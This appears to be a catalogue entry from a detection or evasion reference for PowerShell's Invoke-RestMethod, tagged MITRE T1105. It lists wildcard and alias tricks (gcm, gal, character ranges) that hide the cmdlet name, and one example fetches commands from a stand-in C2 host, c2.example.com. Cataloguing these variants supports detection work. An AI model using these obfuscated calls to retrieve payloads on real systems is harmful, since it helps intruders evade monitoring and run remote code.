---
Name: Invoke-RestMethod
Description: "Send HTTP/HTTPS requests and receive structured responses. Used for C2 communication, API interactions, and payload retrieval."
Platform: powershell
BinaryPath:
  - "PowerShell cmdlet"
Category: download
MitreID: T1105
Patterns:
  - Pattern: "& (gcm I*-R*M*) -Uri http://c2.example.com/cmd"
    Wildcards: ["*"]
    Notes: "Wildcards in verb and both parts of noun"
  - Pattern: "& (gcm Invoke-Rest*) -Uri ..."
    Wildcards: ["*"]
    Notes: "Star matches 'Method'"
  - Pattern: "& (gcm I*ke-RestMethod) -Uri ..."
    Wildcards: ["*"]
    Notes: "Wildcard in verb only"
  - Pattern: "& (gcm *RestMethod) -Uri ..."
    Wildcards: ["*"]
    Notes: "Prefix wildcard"
  - Pattern: "irm -Uri ..."
    Wildcards: []
    Notes: "Built-in alias 'irm' — not a glob but used in combination"
  - Pattern: "& (gcm Invok[d-f]-RestMethod) -Uri ..."
    Wildcards: ["[d-f]"]
    Notes: "Character range matches 'e' in Invoke"
  - Pattern: "& (gal ir?) -Uri ..."
    Wildcards: ["?"]
    Notes: "Get-Alias with wildcard resolves 'irm'"
  - Pattern: "& (gcm *-Rest*od) -Uri ..."
    Wildcards: ["*"]
    Notes: "Multiple wildcards with partial matching"
Resources:
  - https://attack.mitre.org/techniques/T1105/
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod
---
